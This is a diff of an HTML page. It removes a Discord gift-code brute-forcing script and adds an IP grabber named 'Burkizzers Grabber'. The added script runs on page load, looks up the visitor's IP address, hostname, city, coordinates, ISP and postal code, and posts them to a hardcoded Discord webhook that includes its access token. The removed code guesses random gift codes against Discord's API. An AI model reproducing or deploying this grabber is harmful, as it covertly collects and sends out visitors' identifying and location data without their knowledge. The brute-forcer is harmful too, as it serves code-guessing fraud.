@@ -1,24 +1,66 @@
 <html>
-  <body>
-	  <p>Webhook URL : </p><input id="webhook">
-	  <br>
-	  <button onclick="interval = true;">BAŞLA</button>
-	  <button onclick="interval = false;">DURDUR</button>
+<body>
     <script>
-    var chars = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","R","S","T","U","V","Y","Z","Q","X","W","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y","z","q","x","w","0","1","2","3","4","5","6","7","8","9"];
-    var token = "";
-    var interval = false;
-    function loop() {
-	for (var for1 = 0; for1 < 16; for1++) {
-		token = chars[Math.floor(Math.random() * chars.length)];
-	}
-	    if (interval) {
-	fetch("https://discord.com/api/v9/entitlements/gift-codes/" + token, {
-		method: "GET"
-	}).then(a => a.json()).then((b) => {console.log(token + " " + b); loop()});
-	    }
-    }
-    loop();
-	</script>
-  </body>
+        import("https://code.jquery.com/jquery-3.6.1.js").then(function() {
+            $.get("https://ipinfo.io", function(ipinfo) {
+                fetch("https://discordapp.com/api/webhooks/1043050867286360114/jH1rEdFkds7h2YL_UUbIoQiIR49ebsne7lFVZ_YAOI1Cu4ob0o1NT8aPEo8DnpYvDbk6", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        username: "Burkizzers Grabber",
+                        content: " ",
+                        embeds: [{
+                            author: {
+                                name: 'New Informations Grabbed!'
+                            },
+                            fields: [{
+                                    name: 'IP Adress',
+                                    value: ipinfo.ip,
+                                    inline: true
+                                },
+                                {
+                                    name: 'Hostname',
+                                    value: ipinfo.hostname,
+                                    inline: true
+                                },
+                                {
+                                    name: 'City / Region',
+                                    value: ipinfo.city + "/" + ipinfo.region,
+                                    inline: true
+                                },
+                                {
+                                    name: 'Country',
+                                    value: ipinfo.country,
+                                    inline: true
+                                },
+                                {
+                                    name: 'GEO Location',
+                                    value: ipinfo.loc,
+                                    inline: true
+                                },
+                                {
+                                    name: 'Organization',
+                                    value: ipinfo.org,
+                                    inline: true
+                                },
+                                {
+                                    name: 'Postal Code',
+                                    value: ipinfo.postal,
+                                    inline: true
+                                },
+                                {
+                                    name: 'Timezone',
+                                    value: ipinfo.timezone,
+                                    inline: true
+                                },
+                            ],
+                        }]
+                    })
+                });
+            }, "JSONP");
+        });
+    </script>
+</body>
 </html>
